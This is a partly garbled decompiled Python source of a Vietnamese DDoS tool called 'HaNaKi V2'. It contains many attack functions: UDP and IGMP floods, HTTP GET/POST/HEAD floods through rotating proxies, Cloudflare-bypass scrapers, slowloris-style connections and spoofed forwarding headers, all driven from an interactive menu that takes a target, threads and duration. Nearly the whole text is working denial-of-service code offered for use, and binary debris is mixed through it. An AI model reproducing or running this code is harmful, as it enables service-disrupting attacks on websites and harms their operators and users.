  }d| d � d|� d|� d|� d|� d�S )N)��   �   r   rR   �.�   ��   r   ��   rR   �   ��   rr   z-X-Forwarded-Proto: Http
X-Forwarded-target: rY   z, 1.1.1.1
Via: z
Client-IP: z
X-Forwarded-For: z
Real-IP: r^   )r�   r�   Z	randrange)rY   Zaddr�dZspoofipr   r   r   �spoof�  s&   ,������r�   c                  C   s�   t �dtj d tj d tj � t� } t �dtj d tj d tj � t� }t �dtj d tj d tj � t� }| ||fS )N�   [38;2;255;20;147m • zLINK/IP      �: zPOST         zTIME(S)      �r!   r4   r"   rl   �LIGHTCYAN_EX�LIGHTGREEN_EX�input)rY   �threadr6   r   r   r   �get_info_l7�  s   $$$
r�   c                  C   s�   t �dtj d tj d tj � t� } t �dtj d tj d tj � t� }t �dtj d tj d tj � t� }t �dtj d tj d tj � t� }| |||fS )Nr�   z	IP       r�   z	PORT     z	THREAD   z	TIME(s)  r�   )rY   rS   r�   r6   r   r   r   �get_info_l4�  s   $$$$r�   c                 C   sf   t j �� t jt|�d� }t�d�}tt|��D ]}ztjt	| |||fd�}|�
�  W q   Y qd S )Nr-   i   �rY   r   )r.   r/   r0   r1   r�   �_urandomrw   �	threadingr   �flooder�start�rY   rS   r�   r6   r7   �randr~   �thdr   r   r   �
runflooder�  s   
�r�   c                 C   sn   t � t jt j�}|tj��  �� dkr5z|�|tt|�f� W n   |�	�  Y |tj��  �� dksd S d S �Nr   )
r�   r�   �IPPROTO_IGMPr.   r/   r2   �sendtorY   r1   rD   )ZhtargetrS   r�   �until_datetime�sockr   r   r   r�   �  �   �r�   c                 C   sn   |dkr	t �d�}tj�� tjt|�d� }tt|��D ]}ztjt	| |||fd�}|�
�  W q   Y qd S )NrM   i`�  r-   r�   )r�   r�   r.   r/   r0   r1   rw   r�   r   �senderr�   )rY   rS   r�   r6   �payloadr7   r~   r�   r   r   r   �	runsender�  s   
�r�   c                 C   s�   t � t jt j�}|�t jt jd� |tj��  �� dkr>z|�	|| t
|�f� W n   |��  Y |tj��  �� dksd S d S )NrR   r   )r�   r�   Z
SOCK_DGRAM�
setsockopt�
SOL_SOCKET�SO_REUSEADDRr.   r/   r2   r�   r1   rD   )rY   rS   r�   r�   r�   r   r   r   r�   �  s   �r�   c                 C   �`   t j �� t jt|�d� }d}tt|��D ]}ztjt| |||fd�}|��  W q   Y qd S �Nr-   �	 /    r�   )	r.   r/   r0   r1   rw   r�   r   �miner�   r�   r   r   r   �runmine�  �   �r�   c                 C   �n   t � t jt j�}|tj��  �� dkr5z|�d| t|�f� W n   |��  Y |tj��  �� dksd S d S �Nr   r�   �	r�   r�   r�   r.   r/   r2   r�   r1   rD   �rY   rS   r�   r�   r�   r   r   r   r�   �  r�   r�   c                 C   r�   r�   )	r.   r/   r0   r1   rw   r�   r   �vser�   r�   r   r   r   �runvse�  r�   r�   c                 C   r�   r�   r�   r�   r   r   r   r�     r�   r�   c              
   C   s&   t �d| � d|� d|� d|� �� d S )Nztc.exe � )rj   r   )rY   rS   �threadsr|   r   r   r   �	tcpcustom
  s   &r�   c                 C   s�   zt jdd�|�d�|�d�|d�j}W n   | }Y | |kr<ttjd�|� � tdd�}|�d�|�� |�	�  d S ttj
d	�|� � d S )
Nrp   z	http://{}�ZhttprT   )rn   �timeoutz{} good!r\   za+z{}
z{} bad)rb   rC   r�   r`   r)   r"   �GREENr(   r4   rD   r5   )r�   �prox�qtimeZipxrE   r   r   r   �check  s   (
r�   c                 C   �X   t j �� t jt|�d� }tt|��D ]}ztjt| |fd�}|��  W q   Y qd S �Nr-   r�   )	r.   r/   r0   r1   rw   r�   r   �
AttackHEADr�   �rY   r�   r6   r7   r~   r�   r   r   r   �
LaunchHEAD$  �   �r�   c                 C   �V   |t j ��  �� dkr)zt�| � t�| � W n   Y |t j ��  �� dksd S d S r�   )r.   r/   r2   rB   �head�rY   r�   r   r   r   r�   .  �   
�r�   c                 C   r�   r�   )	r.   r/   r0   r1   rw   r�   r   �
AttackPOSTr�   r�   r   r   r   �
LaunchPOST:  r�   r�   c                 C   r�   r�   )r.   r/   r2   rB   �postr�   r   r   r   r�   D  r�   r�   c                 C   r�   r�   )	r.   r/   r0   r1   rw   r�   r   �	AttackRAWr�   r�   r   r   r   �	LaunchRAWP  r�   r�   c                 C   r�   r�   )r.   r/   r2   rB   rC   r�   r   r   r   r�   Z  r�   r�   c                 C   r�   r�   )	r.   r/   r0   r1   rw   r�   r   �AttackPXRAWr�   r�   r   r   r   �LaunchPXRAWf  r�   r�   c                 C   s~   |t j ��  �� dkr=dtt�tt��� }||d�}ztj	| |d� tj	| |d� W n   Y |t j ��  �� dksd S d S �Nr   zhttp://r�   )rn   )
r.   r/   r2   r�   r�   �choice�listrn   rB   rC   )rY   r�   �proxyr   r   r   r�   p  s   ��r�   c                 C   s�   t | �} tj�� tjt|�d� }d| d  d }|d| d  d 7 }|dt�t� d 7 }|d7 }|d	7 }tt|��D ]}zt	j
t| ||fd
�}|��  W q<   Y q<d S )Nr-   �GET rY   � HTTP/1.1
�target: r^   �User-Agent: ��Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
'�Connection: Keep-Alive

r�   )rZ   r.   r/   r0   r1   r�   r�   �uarw   r�   r   �AttackPXSOCr�   �rY   r�   r6   r7   �reqr~   r�   r   r   r   �LaunchPXSOC�  s   �r  c                 C   sN  |t j ��  �� dkr�z�t�tt���d�}| d dkrOt�	� }|�
tjtjd� |�tjt|d �t|d �� |�t| �td�� t�� j|| d d�}n't�	� }|�
tjtjd� |�tjt|d �t|d �� |�t| �td	�� ztd
�D ]
}|�t�|�� q{W n   |��  Y W n   Y d S |t j ��  �� dksd S d S )Nr   rQ   r�   r�   rR   r�   rO   �Zserver_hostname�P   �d   )r.   r/   r2   r�   r�   r   rn   rX   �socks�
socksocketr�   r�   �IPPROTO_TCP�TCP_NODELAY�	set_proxyr_   r�   r1   r�   �ssl�create_default_context�wrap_socketrw   r�   r�   rD   �rY   r�   r  r  r�   r~   r   r   r   r	  �  s.     �
��r	  c                 C   s�   t | �} tj�� tjt|�d� }d| d� d | d� d }|dt�t� d 7 }|d7 }|d7 }tt|��D ]}zt	j
t| ||fd	�}|��  W q8   Y q8d S �
Nr-   r  rY   � HTTP/1.1
Host: r^   r  r  r  r�   )rZ   r.   r/   r0   r1   r�   r�   r  rw   r�   r   �	AttackSOCr�   r
  r   r   r   �	LaunchSOC�  s   �r  c                 C   s�   | d dkr)t �� }|�tjtjd� |�t| �td�� t	�
� j|| d d�}nt �� }|�tjtjd� |�t| �td�� |tj��  �� dkryzztd	�D ]
}|�t�|�� qQW n   |��  Y W n   Y |tj��  �� dksKd S d S )
Nr�   r�   rR   r�   rY   r  r  r   r  �r  r  r�   r�   r  r  r�   r�   r1   r  r  r  r.   r/   r2   rw   r�   r�   rD   �rY   r�   r  r�   r~   r   r   r   r  �  s(   �
��r  c                 C   s`   t | �} tj�� tjt|�d� }tt|��D ]}ztjt| |fd�}|�	�  W q   Y qd S r�   )
rZ   r.   r/   r0   r1   rw   r�   r   �	AttackPPSr�   r�   r   r   r   �	LaunchPPS�  s   �r   c                 C   s
  | d dkr.t �� }|�tjtjd� |�t| d �t| d �f� t	�
� j|| d d�}nt �� }|�tjtjd� |�t| d �t| d �f� |tj��  �� dkr�zztd�D ]
}|�t�d	�� q[W n   |��  Y W n   Y |tj��  �� dksUd S d S )
Nr�   r�   rR   rO   rS   r  r   r  zGET / HTTP/1.1

r  )rY   r�   r�   r~   r   r   r   r  �  �(   �
��r  c                 C   s�   t | �} tj�� tjt|�d� }d| d  d | d  d }|d7 }|d7 }|t| �d 7 }tt|��D ]}ztjt	| ||fd�}|�
�  W q5   Y q5d S )	Nr-   r  rY   r  r^   zUser-Agent: null
zReferrer: null
r�   )rZ   r.   r/   r0   r1   r�   rw   r�   r   �
AttackNULLr�   r
  r   r   r   �
LaunchNULL�  s   �r#  c                 C   �
  | d dkr.t �� }|�tjtjd� |�t| d �t| d �f� t	�
� j|| d d�}nt �� }|�tjtjd� |�t| d �t| d �f� |tj��  �� dkr�zztd�D ]
}|�t�|�� q[W n   |��  Y W n   Y |tj��  �� dksUd S d S �	Nr�   r�   rR   rY   rS   r  r   r  r  r  r   r   r   r"  �  r!  r"  c                 C   s�   t | �} tj�� tjt|�d� }d| d  d | d  d }|dt�t� d 7 }|d7 }|t| �7 }|d7 }t	t|��D ]}zt
jt| ||fd	�}|��  W q>   Y q>d S r  )rZ   r.   r/   r0   r1   r�   r�   r  r�   rw   r�   r   �AttackSPOOFr�   r
  r   r   r   �LaunchSPOOF  s   �r'  c                 C   r$  r%  r  r  r   r   r   r&  #  r!  r&  c           	      C   s�   t | �} tj�� tjt|�d� }d| d  d | d  d }|dt�t� d 7 }|d7 }|t| �7 }|d7 }t	t|��D ]}zt�|�}t
jt| |||fd	�}|��  W q>   Y q>d S r  )rZ   r.   r/   r0   r1   r�   r�   r  r�   rw   r�   r   �AttackPXSPOOFr�   )	rY   r�   r6   r  r7   r  r~   Zrandomproxyr�   r   r   r   �LaunchPXSPOOF8  s   
�r)  c                 C   sJ  |� d�}t|� zZ| d dkr?t�� }|�tjt|d �t|d �� |�t| d �t| d �f� t	�
� j|| d d�}n#t�� }|�tjt|d �t|d �� |�t| d �t| d �f� W n   Y d S |tj��  �� dkr�zztd	�D ]
}|�t�|�� q{W n   |��  Y W n   Y |tj��  �� dksud S d S )
NrQ   r�   r�   r   rR   rY   rS   r  r  )rX   r)   r  r  r  r[   r�   r1   r�   r  r  r  r.   r/   r2   rw   r�   r�   rD   r  r   r   r   r(  I  s4   
  ��
��r(  c                 C   �b   t j �� t jt|�d� }t�� }tt|��D ]}ztjt	| ||fd�}|�
�  W q   Y qd S r�   �r.   r/   r0   r1   �cloudscraper�create_scraperrw   r�   r   �	AttackCFBr�   �rY   r�   r6   r7   �scraperr~   r�   r   r   r   �	LaunchCFBf  �   �r1  c                 C   s^   |t j ��  �� dkr-z|j| dd� |j| dd� W n   Y |t j ��  �� dksd S d S )Nr   �   �r�   �r.   r/   r2   rC   )rY   r�   r0  r   r   r   r.  q  s   �r.  c                 C   r*  r�   )r.   r/   r0   r1   r,  r-  rw   r�   r   �AttackPXCFBr�   r/  r   r   r   �LaunchPXCFB}  r2  r7  c                 C   s�   |t j ��  �� dkrDz'dtt�tt��� dtt�tt��� d�}|j| |d� |j| |d� W n   Y |t j ��  �� dksd S d S r�   )	r.   r/   r2   r�   r�   r�   r   rn   rC   )rY   r�   r0  r  r   r   r   r6  �  s   ��r6  c           	      C   �   t j �� t jt|�d� }t�� }tj|d�}t� }|�	t
d t
d � ||_tt|��D ]}ztjt| ||fd�}|��  W q-   Y q-d S �Nr-   )Zsessr   ru   r�   �r.   r/   r0   r1   rB   ZSessionr,  r-  r    �setrx   r   rw   r�   r   �AttackCFPROr�   �	rY   r�   r6   r7   Zsessionr0  Zjarr~   r�   r   r   r   �LaunchCFPRO�  �   �r>  c                 C   �   dddddddddd	d
ddd�}|t j ��  �� dkr?z|j| |dd� |j| |dd� W n   Y |t j ��  �� dksd S d S �N��Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�#tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7�deflate, gzip;q=1.0, *;q=0.5�no-cache�
keep-alive�1�document�navigate�same-origin�?1�trailers�z
User-AgentZAcceptzAccept-LanguagezAccept-EncodingzCache-ControlZPragmaZ
ConnectionzUpgrade-Insecure-RequestszSec-Fetch-DestzSec-Fetch-ModezSec-Fetch-SitezSec-Fetch-UserZTEr   F�rY   �headers�allow_redirectsr5  �rY   r�   r0  rP  r   r   r   r<  �  �*   ��r<  c           	      C   r8  r9  r:  r=  r   r   r   r>  �  r?  c                 C   r@  rA  r5  rR  r   r   r   r<  �  rS  c           	      C   s�   t | �} t�t�}tj�� tjt|�d� }t�t�}t�t�}|| d  d t�	dd� d t�	dd� d | d  d	 }||d	 7 }|d
7 }|d7 }t
t|��D ]}ztjt| ||fd�}|��  W qR   Y qRd S )Nr-   rL   �?rR   ��  rt   r  rO   r^   r  z3Connection: Keep-Alive
Cache-Control: no-cache

r�   )rZ   r�   r�   �
useragentsr.   r/   r0   r1   �methodr�   rw   r�   r   �
AttackHULKr�   )	rY   r�   r6   �
user_agentr7   �mr  r~   r�   r   r   r   �
LaunchHULK�  s    


<�r[  c                 C   s4  | d dkr.t �� }|�tjtjd� |�t| d �t| d �f� t	�
� j|| d d�}n1t �� }|�tjtjd� |�t| d �t| d �f� t	�
� }d}|�|� |j|t| �jd�}|tj��  �� dkr�zztd	�D ]
}|�t�|�� qpW n   |��  Y W n   Y |tj��  �� dksjd S d S )
Nr�   r�   rR   rY   rS   r  �  :ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSKr   r  )r  r  r�   r�   r  r  r�   r�   r1   r  r  r  �set_ciphersr   rW   r.   r/   r2   rw   r�   r�   rD   )rY   r�   r  r�   �ctx�cipherr~   r   r   r   rX  �  s0   
�
��rX  c                 C   �,   t t|��D ]}tjt| |fd���  qd S �Nr�   )rw   r1   r�   r   �
Launchslowr�   �rY   r�   r6   r�   r   r   r   �
attackslow  �   �rd  c           
      C   s�  t �  tdd��� �d�}t�|��� �d�}t�� t|� }t�t	�}t�t
�}|d t| �j d }|d7 }||d 7 }|d7 }|d	7 }|d
7 }|d7 }|d7 }|d7 }|d7 }t�� |k r�zvt�� }|�tt| �j�td�f� |�tjt|d �t|d �� t�� }	|	j|t| �jd�}|�d�t�dd���d�� |�d�t�t
���d�� |�d�d��d�� |�d�d�� 	 t�d� |�d�t�dd���d�� q�   |��  t�  Y t�� |k s`d S d S )Nrd   rb   ri   rQ   � / HTTP/1.1
Host: r^   �Cache-Control: no-cache
r  �Sec-Fetch-Site: same-origin
�Sec-GPC: 1
�Sec-Fetch-Mode: navigate
�Sec-Fetch-Dest: document
�Upgrade-Insecure-Requests: 1
r  r�   r   rR   r  r�   r�   zutf-8zUser-Agent: {}
r�   r�   zConnection:keep-aliveT�   z	X-a: {}
r�   )rG   r(   rm   rX   r�   r�   �stripr|   r1   rW  rV  r   rW   r  r  r�   r�   r  r[   r  �
SSLContextr  r�   r�   r�   r�   r}   rD   rb  )
rY   r6   r�   r  �timelolrZ  rY  r  r�   r^  r   r   r   rb    sF   

 
��rb  c                 C   �,   t t|��D ]}tjt| |fd���  qd S ra  )rw   r1   r�   r   �Launchguardsr�   �rY   r6   r�   r�   r   r   r   �attackguards:  re  rt  c                 C   s�  t dd��� �d�}t�|��� �d�}t�� t|� }t�t�}t�t	�}|d t
| �j d }|d7 }||d 7 }|d7 }|d	7 }|d
7 }|d7 }|d7 }|d7 }|d7 }t�� |k r�zet�� }|�tjt|d �t|d �� |�tjtjd� |�tt
| �j�td�f� t�� }	|	j|t
| �jd�}|�t�|�� ztd�D ]}
|�t�|�� |�t�|�� q�W n   |��  Y W n   |��  Y t�� |k s]d S d S )Nrd   rb   ri   rQ   rf  r^   rg  r  rh  ri  rj  rk  rl  r  r   rR   r�   r  ��   )r(   rm   rX   r�   r�   rn  r|   r1   rW  rV  r   rW   r  r  r  r_   r�   r�   r�   r�   r�   r�   r  ro  r  r�   r�   rw   rD   )rY   r6   r�   r  rp  rZ  rY  r  r�   r^  r~   r   r   r   rr  >  sF   

 �
�
�rr  c                 C   rq  ra  �rw   r1   r�   r   �LaunchSTELLARr�   rs  r   r   r   �attackSTELLAR_  re  rx  c           	      C   sX  t � � tt� }t�t�}t�t�}|d t| �j d }|d7 }||d 7 }|d7 }|d7 }|d7 }|d7 }|d7 }|d	7 }|d
7 }t � � |k r�zPt	�	t	j
t	j�}|�tt| �j�td�f� t�� }|j|t| �jd�}|�t�|�� ztd�D ]}|�t�|�� |�t�|�� q{W n   |��  Y W n   |��  Y t � � |k sId S d S �Nrf  r^   rg  r  rh  ri  rj  rk  rl  r  r�   r  ru  )r|   r1   r6   r�   r�   rW  rV  r   rW   r�   r�   r�   r�   r�   r  ro  r  r�   r�   rw   rD   )	rY   Ztrrp  rZ  rY  r  r�   r^  r�   r   r   r   rw  c  �>   

�
�
�rw  c                 C   r*  r�   r+  r/  r   r   r   r1  �  r2  c                 C   sz   |t j ��  �� dkr;td�D ]}z|j| dd� |j| dd� |j| dd� W q   Y q|t j ��  �� dksd S d S )Nr   r  �   r4  )r.   r/   r2   rw   rC   r�   r�   )rY   r�   r0  r~   r   r   r   r.  �  s   �c                 C   rq  ra  )rw   r1   r�   r   r7  r�   rs  r   r   r   �attackPXCFB�  re  r|  c                 C   s�  t dd��� �d�}t�|��� �d�}t�� t|� }t�t�}t�t	�}|d t
| �j d }|d7 }||d 7 }|d7 }|d	7 }|d
7 }|d7 }|d7 }|d7 }|d7 }t�� |k r�zmt�� }|�tjt|d �t|d �� |�tjtjd� |�tt
| �j�td�f� t�� }	dg}
|	�|
� |	j|t
| �jd�}|�t�|�� ztd�D ]}|�t�|�� |�t�|�� q�W n   |��  Y W n   |��  Y t�� |k s]d S d S )Nz
./http.txtrb   ri   rQ   z / HTTP/1.3
Host: r^   rg  r  rh  ri  rj  rk  rl  r  r   rR   r�   r\  r  ru  )r(   rm   rX   r�   r�   rn  r|   r1   rW  rV  r   rW   r  r  r  r_   r�   r�   r�   r�   r�   r�   r  r  r]  r  r�   r�   rw   rD   )rY   r6   r�   r  rp  rZ  rY  r  r�   r^  r_  r~   r   r   r   r7  �  sJ   

 
�
�
�c           	      C   r8  r9  r:  r=  r   r   r   r>  �  r?  c                 C   s�   dddddddddd	d
ddd�}|t j ��  �� dkr?z|j| |dd� |j| |dd� W n   Y |t j ��  �� dksd S d S )NrB  rC  rD  rE  rF  rG  rH  rI  rJ  rK  rL  rM  rN  r   F)ZtargetlrP  rQ  rO  r5  rR  r   r   r   r<  �  rS  c           	      C   s
  t j �� t jt|�d� }t| �} t| �\}}d| d  d }|d| d  d 7 }|d7 }|d	7 }|d
7 }|d7 }|d| d 7 }|d7 }|d7 }|d7 }|d7 }|d7 }|d7 }|d7 }|dt d 7 }tt|��D ]}ztj	t
|| |fd�}|��  W qk   Y qkd S )Nr-   r  rL   r  zHost: rO   r^   ��Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
�$Accept-Encoding: gzip, deflate, br
�6Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7
�Cache-Control: max-age=0
zCookie: �8sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"
�sec-ch-ua-mobile: ?0
�sec-ch-ua-platform: "Windows"
�sec-fetch-dest: empty
�sec-fetch-mode: cors
�sec-fetch-site: same-origin
�Connection: Keep-Alive
r  z


r�   )r.   r/   r0   r1   rZ   r�   ry   rw   r�   r   �AttackCFSOCr�   )	rY   Zthr6   r7   rz   rY  r  r~   r�   r   r   r   �LaunchCFSOC�  s2   �r�  c                 C   ��   |d dkr.t �� }|�tjtjd� |�t|d �t|d �f� t	�
� j||d d�}nt �� }|�tjtjd� |�t|d �t|d �f� | tj��  �� dkr|ztd�D ]
}|�t�|�� qZW n   |��  Y | tj��  �� dksUd S d S )	Nr�   r�   rR   rO   rS   r  r   �
   r  �r�   rY   r  Zpacketr~   r   r   r   r�    �"   ��r�  c                 C   rq  ra  )rw   r1   r�   r   �	LaunchSKYr�   rs  r   r   r   �	attackSKY  re  r�  c                 C   sv  t �t��� �d�}t�� t|� }dt| �j d }|d7 }|dt �t	� d 7 }|d7 }|d7 }|d7 }|d	7 }|d
7 }|d7 }|d7 }t�� |k r�z\t
�� }|�tt| �j�td�f� |�t
jt|d �t|d �� t�� }|j|t| �jd�}|�t�|��}ztd�D ]}|�t�|��}|�t�|��}q�W n   |��  Y W n   |��  Y t�� |k sLd S d S )NrQ   zGET / HTTP/1.1
Host: r^   rg  r  r  rh  ri  rj  rk  rl  r  r�   r   rR   r  r  )r�   r�   rn   rn  rX   r|   r1   r   rW   r  r  r  r�   r�   r  r[   r  ro  r  r�   r�   rw   rD   )rY   r6   r  rp  r  r�   r^  r~   r   r   r   r�     s>    �
�
�r�  c                 C   r`  ra  rv  rc  r   r   r   rx  ?  re  c           	      C   sX  t � � t|� }t�t�}t�t�}|d t| �j d }|d7 }||d 7 }|d7 }|d7 }|d7 }|d7 }|d7 }|d	7 }|d
7 }t � � |k r�zPt�tj	tj
�}|�tt| �j�td�f� t�� }|j|t| �jd�}|�t�|�� ztd�D ]}|�t�|�� |�t�|�� q{W n   |��  Y W n   |��  Y t � � |k sId S d S ry  )r|   r1   r�   r�   rW  rV  r   rW   r�   r�   r�   r�   r�   r  ro  r  r�   r�   rw   rD   )	rY   r6   rp  rZ  rY  r  r�   r^  r�   r   r   r   rw  C  rz  c                 C   s�   t j �� t jt|�d� }t| �} d| d  d }|d| d  d 7 }|d7 }|d7 }|d	7 }|d
7 }|d7 }|d7 }|d7 }|d7 }|d7 }|d7 }|d7 }|d7 }tt|��D ]}ztjt|| |fd�}|�	�  W qY   Y qYd S )Nr-   r  rY   r  r  r^   r}  r~  r  r�  r�  r�  r�  r�  r�  r�  r�  z�User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en


r�   )
r.   r/   r0   r1   rZ   rw   r�   r   �test2r�   r
  r   r   r   �test1f  s.   �r�  c                 C   r�  )	Nr�   r�   rR   rY   rS   r  r   r�  r  r�  r   r   r   r�  �  r�  r�  c                 C   s^   	 zt �| �}ttjjd tjj � W n t jjy-   ttjj	d tjj
 d � Y nw q)NTzRequest sent!z[+] zConnection error!)rB   rC   r)   �coloramar"   ZYELLOWrl   �
exceptions�ConnectionErrorr5   r�   )rY   r�   r   r   r   �dos�  s   
 ��r�  c                   C   s    t dkr
td� d S td� d S �N�nt�cls�clear)r   r   r   r   r   r   r�  �  s   r�  z
  ri   Tc                 C   s.   | | } | D ]}t |d|d� t�|� qd S )NrM   )�endr3   )r)   r|   r}   )ZtxtZdelayr�  r3   Zletterr   r   r   �printf�  s
   �r�  c                   C   s&   t t�tjdd�dd� t� �� �� S )Nz<
[1;34m[[1;34mHaNaKi[1;31m@[1;34mtriet[1;34m][1;32m > Tr�   �r�  )r�  r   �Verticalr   Zgreen_to_redr�   rn  �lowerr   r   r   r   �inputf�  s   ��r�  c                   C   s"   t �t jdkrd� d S d� d S r�  )rj   r   r   r   r   r   r   �clr�  s   "r�  c               
   C   sx  t �  tt�t�tjd�d�dd� t�  	 t	� } d| v r1t �  tt�t�tj
d�d�dd� �n�d| v rIt �  tt�t�tjd�d�dd� �nrd| v rht �  tt�t�tj
d	t�t�� d
��d�dd� �nSd| v r�ttjd�t� tj � ttjd tj � �n6d| v r�t� \}}}tjt|fd�}|��  t|||� |��  �nd| v s�d| v r�t� r�t� \}}}tjt|fd�}|��  t|||� |��  �n�d| v s�d| v r�t� \}}}tjt|fd�}|��  t|||� |��  �n�d| v s�d| v �rt� \}}}tjt|fd�}|��  t|||� |��  �n�d| v �s'd| v �rMt� \}}}tjt|fd�}|��  t |||t!d�� |��  t"�#d� �nnd| v �sWd| v �r{t� \}}}tjt$|||fd���  tjt|fd�}|��  |��  �n@d| v �s�d| v �r�t� \}}}tjt%|||fd���  tjt|fd�}|��  |��  �nd| v �s�d| v �r�t� \}}}tjt&|||fd���  tjt|fd�}|��  |��  �n�d | v �r�t'� \}}}}t(||||� �n�d!| v �s�d"| v �rt� \}}}t� �rtjt)|||fd���  tjt|fd�}|��  |��  �n�d#| v �s(d$| v �rLt� \}}}tjt*|||fd���  tjt|fd�}|��  |��  �nod%| v �sVd&| v �r~t� \}}}t� �r|tjt+|||fd���  tjt|fd�}|��  |��  �n=d'| v �s�d(| v �r�t� \}}}t,�-t.j/d) t.j0 d* � t1|��r�tjt2|||fd���  tjt|fd�}|��  |��  �n�t,�-t.j/d) t.j0 d+ � �n�d,| v �s�d-| v �rt� \}}}t,�-t.j/d) t.j0 d* � t1|��rtjt|fd�}|��  t3|||� |��  �n�t,�-t.j/d) t.j0 d+ � �n�d.| v �s d/| v �rHt� �rFt� \}}}tjt4|||fd���  tjt|fd�}|��  |��  �nsd0| v �sRd1| v �rvt� \}}}tjt5|||fd���  tjt|fd�}|��  |��  �nEd2| v �s�d3| v �r�t'� \}}}}tjt6||||fd���  tjt|fd�}|��  |��  �nd4| v �s�d5| v �r�t'� \}}}}tjt7||||fd���  tjt|fd�}|��  |��  �n�d6| v �s�d7| v �rt'� \}}}}tjt8||||fd���  tjt|fd�}|��  |��  �n�d8| v �sd9| v �r6t'� \}}}}tjt9||||fd���  tjt|fd�}|��  |��  �n�d:| v �s@d;| v �rdt� \}}}tjt:|||fd���  tjt|fd�}|��  |��  �nWd<| v �snd=| v �r�t� \}}}t,�-t.j/d) t.j0 d* � t1|��r�tjt2|||fd���  tjt|fd�}|��  |��  �nt,�-t.j/d) t.j0 d+ � �nd>| v �s�d?| v �r�t� \}}}tjt;|||fd���  tjt|fd�}|��  |��  �n�d@| v �s�dA| v �rt� \}}}t� �rtjt<|||fd���  tjt|fd�}|��  |��  �n�dB| v �sdC| v �rAt� \}}}tjt5|||fd���  tjt|fd�}|��  |��  �nzdD| v �sKdE| v �r�zt=t>dF��}|dGk�rYd }W n   tt.j?dH � t@�  Y tA�BdI�}|jC�D� }tEdJdK��F�  |D ]}	g }
tjtGt|	|fd�}|
�H|� |��  �q|�n$dL| v �r�t,�-t.j/dM t.j0 dN t.jI dO t.jJ � t>� }ztA�BdP|� ��}t|jC� W n�   tdQ� Y n�dR| v �rt,�-t.j/dM t.j0 dS t.jI dO t.jJ � t>� }ztA�BdT|� ��}t|jC� W n�   tdQ� Y n�dU| v �r9t,�-t.j/dM t.j0 dN t.jI dO t.jJ � t>� }ztA�BdV|� ��}t|jC� W n�   tdQ� Y n�dW| v �r�zHt,�-t.j/dM t.j0 dX dY � tKD ]4}tL|�}|�rot,�-t.j/dM t.j dZ t.j0 | dY � �qPt,�-t.j/dM t.j? d[ t.j0 | dY � �qPW n4 tM�y� } zt,�-t.j/dM t.j/ d\ t.j? d]|� d^� dY � W Y d }~nd }~ww tt�NtjOd_�� q)`Nuf  
            [1;35m                        ╦ ╦╔═╗╔╗╔╔═╗╦╔═[1;36m╦ ╔═╗╔╦╗╔═╗╔═╗╦╔═  
            [1;35m                        ╠═╣╠═╣║║║╠═╣╠╩╗[1;36m║ ╠═╣ ║ ╠═╣║  ╠╩╗      
            [1;35m                        ╩ ╩╩ ╩╝╚╝╩ ╩╩ ╩[1;36m╩ ╩ ╩ ╩ ╩ ╩╚═╝╩ ╩
            [1;35m                       [1;32mHaNaKi [1;32m, Dominat[1;32ming Since 2022
            [1;35m                      ╚══╦═════════════[1;36m══════════════╦══╝
            [1;35m                         ║  [1;32mWelcome Too[1;32mls HaNaKi V2[1;36m  ║
            [1;35m           ╔═════════════╩════════════╦[1;36m══════════════╩═════════════╗
            [1;35m           ║ [1;32mZalo Me in: 0987979662[1;35m   ║[1;32m Developer: Hà Minh Triết[1;36m   ║
            [1;35m           ╚═══════════╦══════════════╩[1;36m════════════════╦═══════════╝
            [1;35m                       ║    [1;32mNo DDos Chinhphu.vn,Gov[1;36m    ║
            [1;35m                       ╚═════════════╦═[1;36m╦═══════════════╝
            [1;35m           ╔═════════════════════════╝ [1;36m╚═══════════════════════════╗
            [1;35m           ║         [1;32mTools Ddos Website[1;32m By : Hà Minh Triết[1;36m         ║
            [1;35m           ╚═══════════════════════════[1;36m════════════════════════════╝


                                    ẤN tool Để Bật Menu


  TrM   r�  Zcreditu  
      clear()
             ╦══╩═════════════════════════════════╩══╦
             ║        THÔNG TIN ADMIN TOOLS          ║
             ╩══╦═════════════════════════════════╦══╩
      ╔═════════╩═════════════════════════════════╩═════════╗
      ║   Bản quyền Tools      : Hà Minh Triết By HaNaKi    ║
      ╚═════════════════════════════════════════════════════╝
      Ztoolu�  
        ╔═════════════════════════════════════════════════════╗             
        ║                    [MENU DDOS]                      ║
        ║ legendary| Ddos Super Legendary                     ║
        ║ weak     | Ddos Extremely Weak No Proxy             ║
        ║ guards   | Ddos Stable Web Mid - Range              ║
        ║ supers   | Ddos Supers Good Proxy                   ║
        ╚═════════════════════════════════════════════════════╝
      u�   
        clear()
             ╦══╩═════════════════════════════════╩══╦
          u�  
                            CÔNG CỤ
             ╩══╦═════════════════════════════════╦══╩
      ╔═════════╩═════════════════════════════════╩═════════╗          
    
        - proxy               :  Kiểm tra trạng thái proxy
